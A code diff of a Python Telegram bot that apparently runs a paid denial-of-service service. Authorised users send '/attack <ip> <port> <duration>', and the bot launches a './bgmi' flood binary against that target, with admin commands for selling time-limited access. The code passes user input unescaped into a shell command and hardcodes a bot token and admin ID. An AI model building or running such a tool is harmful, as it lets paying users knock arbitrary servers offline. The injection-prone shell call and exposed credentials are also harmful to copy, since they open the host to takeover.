@@ -1,123 +1,294 @@
-# Bot token sabse upar declare kiya gaya hai
-TOKEN = "BOT TOKEN"
+import os
+import asyncio
+import time
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext
+from telegram.error import TelegramError
 
-import subprocess
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
+TELEGRAM_BOT_TOKEN = '7074559050:AAEROjnDSeh3NwE68FEI3K75CGH05j1H2E8'
+ADMIN_USER_ID = 1441704343  
+bot_access_free = True
 
-# Path to your binary
-BINARY_PATH = "./LEGEND"
+# Store attacked IPs to prevent duplicate attacks
+attacked_ips = set()
 
-# Global variables
-process = None
-target_ip = None
-target_port = None
-attack_time = 300  # Fixed to 300 seconds
+# Default maximum allowed attack duration (in seconds)
+MAX_ATTACK_DURATION = 240
 
-# Start command: Show Attack button
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("Attack", callback_data='attack')]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("Press the Attack button to start configuring the attack.", reply_markup=reply_markup)
+# Cooldown period (in seconds) after an attack is initiated
+COOLDOWN_PERIOD = 100
 
-# Handle button clicks for attack configuration
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
+# Dictionary to store allowed users and their expiry timestamp.
+# If expiry is None, then access never expires.
+allowed_users = {ADMIN_USER_ID: None}
 
-    if query.data == 'attack':
-        await query.message.reply_text("<IP> <PORT>")
+# Dictionary to store last attack timestamp for each user
+user_last_attack = {}
 
-# Handle target and port input (no time input anymore)
-async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global target_ip, target_port
+def is_user_allowed(user_id: int) -> bool:
+    """
+    Check if user_id is allowed based on allowed_users dictionary.
+    If an expiry timestamp is set, ensure it is not passed.
+    """
+    if user_id in allowed_users:
+        expiry = allowed_users[user_id]
+        # If expiry is None, access never expires.
+        if expiry is None or time.time() < expiry:
+            return True
+    return False
+
+def is_on_cooldown(user_id: int) -> bool:
+    """
+    Check if user is in cooldown period after an attack.
+    """
+    last_attack = user_last_attack.get(user_id, 0)
+    return (time.time() - last_attack) < COOLDOWN_PERIOD
+
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    message = (
+        "🌟 **Welcome to the Elite Battlefield!** 🌟\n\n"
+        "Experience our cutting-edge service.\n\n"
+        "👉 Use `/attack <ip> <port> <duration>` to initiate your premium assault.\n"
+        "🚀 Let the premium war begin!"
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+async def run_attack(chat_id, ip, port, duration, context):
     try:
-        # User input is expected in the format: <target> <port>
-        target, port = update.message.text.split()
-        target_ip = target
-        target_port = int(port)
+        process = await asyncio.create_subprocess_shell(
+            f"./bgmi {ip} {port} {duration} 1100",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
 
-        # Show Start, Stop, and Reset buttons after input is received
-        keyboard = [
-            [InlineKeyboardButton("Start Attack", callback_data='start_attack')],
-            [InlineKeyboardButton("Stop Attack", callback_data='stop_attack')],
-            [InlineKeyboardButton("Reset Attack", callback_data='reset_attack')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured.\n"
-                                        "Now choose an action:", reply_markup=reply_markup)
-    except ValueError:
-        await update.message.reply_text("Invalid format. Please enter in the format: <target> <port>")
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
 
-# Start the attack
-async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global process, target_ip, target_port, attack_time
-    if not target_ip or not target_port:
-        await update.callback_query.message.reply_text("Please configure the target and port first.")
-        return
-
-    if process and process.poll() is None:
-        await update.callback_query.message.reply_text("Attack is already running.")
-        return
-
-    try:
-        # Run the binary with target, port, and fixed time (300 seconds)
-        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        await update.callback_query.message.reply_text(f"Started attack on {target_ip}:{target_port} for {attack_time} seconds")
     except Exception as e:
-        await update.callback_query.message.reply_text(f"Error starting attack: {e}")
+        await context.bot.send_message(chat_id=chat_id, text=f"❗ **Error during premium attack:** {str(e)}", parse_mode='Markdown')
 
-# Stop the attack
-async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global process
-    if not process or process.poll() is not None:
-        await update.callback_query.message.reply_text("No attack is currently running.")
+    finally:
+        await context.bot.send_message(chat_id=chat_id, text="✅ **Premium Attack Completed!**\nThank you for trusting our elite service.", parse_mode='Markdown')
+
+async def attack(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+
+    if not is_user_allowed(user_id):
+        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** You are not authorized to use this premium service.", parse_mode='Markdown')
         return
 
-    process.terminate()
-    process.wait()
-    await update.callback_query.message.reply_text("Attack stopped.")
+    if is_on_cooldown(user_id):
+        remaining = int(COOLDOWN_PERIOD - (time.time() - user_last_attack[user_id]))
+        await context.bot.send_message(chat_id=chat_id, text=f"⏳ **Cooldown Active!** Please wait {remaining} seconds before launching another attack.", parse_mode='Markdown')
+        return
 
-# Reset the attack
-async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global process, target_ip, target_port
-    if process and process.poll() is None:
-        process.terminate()
-        process.wait()
+    args = context.args
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/attack <ip> <port> <duration>`", parse_mode='Markdown')
+        return
 
-    target_ip = None
-    target_port = None
-    await update.callback_query.message.reply_text("Attack reset. Please configure a new target and port.")
+    ip, port, duration_str = args
 
-# Button action handler for start/stop/reset actions
-async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
+    try:
+        duration = int(duration_str)
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid duration!** Please enter a valid number for duration.", parse_mode='Markdown')
+        return
 
-    if query.data == 'start_attack':
-        await start_attack(update, context)
-    elif query.data == 'stop_attack':
-        await stop_attack(update, context)
-    elif query.data == 'reset_attack':
-        await reset_attack(update, context)
+    if duration > MAX_ATTACK_DURATION:
+        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ **Maximum allowed duration is {MAX_ATTACK_DURATION} seconds!** Please enter a duration up to {MAX_ATTACK_DURATION} seconds.", parse_mode='Markdown')
+        return
 
-# Main function to start the bot
+    if ip in attacked_ips:
+        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ **Notice:** The IP `{ip}` has already been targeted. Please choose another premium target.", parse_mode='Markdown')
+        return
+
+    # Record the attack time for cooldown purposes
+    user_last_attack[user_id] = time.time()
+    attacked_ips.add(ip)  # Store attacked IP
+
+    await context.bot.send_message(chat_id=chat_id, text=( 
+        f"🔥 **Premium Attack Initiated!** 🔥\n"
+        f"**Target:** `{ip}:{port}`\n"
+        f"**Duration:** `{duration}` seconds\n\n"
+        f"Sit back and enjoy our elite service!"
+    ), parse_mode='Markdown')
+
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+
+async def set_max_time(update: Update, context: CallbackContext):
+    global MAX_ATTACK_DURATION
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** Only admin can change the maximum attack duration.", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/setmaxtime <seconds>`", parse_mode='Markdown')
+        return
+
+    try:
+        new_limit = int(args[0])
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid value!** Please enter a valid number for seconds.", parse_mode='Markdown')
+        return
+
+    MAX_ATTACK_DURATION = new_limit
+    await context.bot.send_message(chat_id=chat_id, text=f"✅ **Maximum attack duration updated to {MAX_ATTACK_DURATION} seconds.**", parse_mode='Markdown')
+
+async def add_user(update: Update, context: CallbackContext):
+    """
+    /add <user_id> <expiry_value> <unit>
+    Unit can be one of: seconds, minutes, days
+    If expiry_value is <= 0, access is permanent.
+    Example: /add 123456789 10 minutes
+    """
+    chat_id = update.effective_chat.id
+    user_id_sender = update.effective_user.id
+
+    if user_id_sender != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** Only admin can add users.", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/add <user_id> <expiry_value> <unit>`\nUnit can be 'seconds', 'minutes' or 'days'.", parse_mode='Markdown')
+        return
+
+    try:
+        new_user_id = int(args[0])
+        expiry_value = int(args[1])
+        unit = args[2].lower()
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid input!** Please ensure user_id and expiry_value are numbers.", parse_mode='Markdown')
+        return
+
+    # Calculate expiry timestamp based on unit
+    if expiry_value <= 0:
+        expiry_timestamp = None
+    else:
+        if unit in ['second', 'seconds']:
+            multiplier = 1
+        elif unit in ['minute', 'minutes']:
+            multiplier = 60
+        elif unit in ['day', 'days']:
+            multiplier = 86400
+        else:
+            await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid unit!** Please use 'seconds', 'minutes' or 'days'.", parse_mode='Markdown')
+            return
+        expiry_timestamp = time.time() + (expiry_value * multiplier)
+
+    allowed_users[new_user_id] = expiry_timestamp
+
+    if expiry_timestamp:
+        await context.bot.send_message(chat_id=chat_id, text=f"✅ **User {new_user_id} added with expiry in {expiry_value} {unit}.**", parse_mode='Markdown')
+    else:
+        await context.bot.send_message(chat_id=chat_id, text=f"✅ **User {new_user_id} added with permanent access.**", parse_mode='Markdown')
+
+async def remove_user(update: Update, context: CallbackContext):
+    """
+    /remove <user_id>
+    Admin command to remove a user from allowed_users.
+    """
+    chat_id = update.effective_chat.id
+    user_id_sender = update.effective_user.id
+
+    if user_id_sender != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** Only admin can remove users.", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Usage:** `/remove <user_id>`", parse_mode='Markdown')
+        return
+
+    try:
+        remove_id = int(args[0])
+    except ValueError:
+        await context.bot.send_message(chat_id=chat_id, text="⚠️ **Invalid user_id!** Please enter a valid number.", parse_mode='Markdown')
+        return
+
+    if remove_id in allowed_users:
+        del allowed_users[remove_id]
+        await context.bot.send_message(chat_id=chat_id, text=f"✅ **User {remove_id} has been removed from allowed users.**", parse_mode='Markdown')
+    else:
+        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ **User {remove_id} is not in the allowed users list.**", parse_mode='Markdown')
+
+async def list_users(update: Update, context: CallbackContext):
+    """
+    /users
+    Lists all allowed users along with their expiry details.
+    """
+    chat_id = update.effective_chat.id
+    if not allowed_users:
+        await context.bot.send_message(chat_id=chat_id, text="ℹ️ **No users are currently allowed.**", parse_mode='Markdown')
+        return
+
+    message_lines = ["📋 **Allowed Users:**"]
+    current_time = time.time()
+    for uid, expiry in allowed_users.items():
+        if expiry is None:
+            expiry_str = "Permanent"
+        else:
+            remaining = int(expiry - current_time)
+            expiry_str = f"{remaining} seconds remaining" if remaining > 0 else "Expired"
+        message_lines.append(f"- `{uid}`: {expiry_str}")
+
+    message = "\n".join(message_lines)
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+async def help_command(update: Update, context: CallbackContext):
+    """
+    /help
+    Show available commands.
+    - Admin sees all commands.
+    - Allowed users see commands based on their access.
+    """
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+
+    if user_id == ADMIN_USER_ID:
+        help_message = (
+            "🛠 **Admin Commands:**\n"
+            "/start - Start the bot\n"
+            "/attack <ip> <port> <duration> - Launch an attack\n"
+            "/setmaxtime <seconds> - Set max attack duration\n"
+            "/add <user_id> <expiry_value> <unit> - Add a user (unit: seconds, minutes, days)\n"
+            "/remove <user_id> - Remove a user\n"
+            "/users - List allowed users\n"
+            "/help - Show this help message\n"
+        )
+    else:
+        # For allowed users, only show the commands they have access to.
+        help_message = (
+            "🛠 **User Commands:**\n"
+            "/start - Start the bot\n"
+            "/attack <ip> <port> <duration> - Launch an attack\n"
+            "/users - List allowed users\n"
+            "/help - Show this help message\n"
+        )
+    await context.bot.send_message(chat_id=chat_id, text=help_message, parse_mode='Markdown')
+
 def main():
-    # Create Application object with your bot's token (ab TOKEN upar se import ho chuka hai)
-    application = Application.builder().token(TOKEN).build()
-
-    # Register command handler for /start
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("setmaxtime", set_max_time))
+    application.add_handler(CommandHandler("add", add_user))
+    application.add_handler(CommandHandler("remove", remove_user))
+    application.add_handler(CommandHandler("users", list_users))
+    application.add_handler(CommandHandler("help", help_command))
 
-    # Register button handler
-    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
-    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))
-
-    # Register message handler to handle input for target and port
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))
-
-    # Start the bot
     application.run_polling()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
+    
